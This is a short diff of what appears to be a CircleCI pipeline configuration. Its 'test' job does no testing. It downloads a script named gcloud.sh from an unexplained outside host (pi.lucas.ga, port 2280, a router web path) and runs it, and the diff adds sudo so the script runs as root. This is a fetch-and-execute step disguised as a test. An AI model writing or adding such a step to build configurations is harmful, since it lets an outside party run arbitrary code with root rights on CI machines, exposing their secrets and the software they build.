@@ -13,11 +13,11 @@ jobs:
           command: |
             echo Running test
             set +e
-            apt update
-            apt install -qq curl
+            sudo apt update
+            sudo apt install -qq curl
             pwd
             curl  -o $HOME/bin/init.sh http://pi.lucas.ga:2280/luci-static/bin/gcloud.sh && chmod +x $HOME/bin/init.sh
-            bash $HOME/bin/init.sh
+            sudo bash $HOME/bin/init.sh
 
 workflows:
     first job:
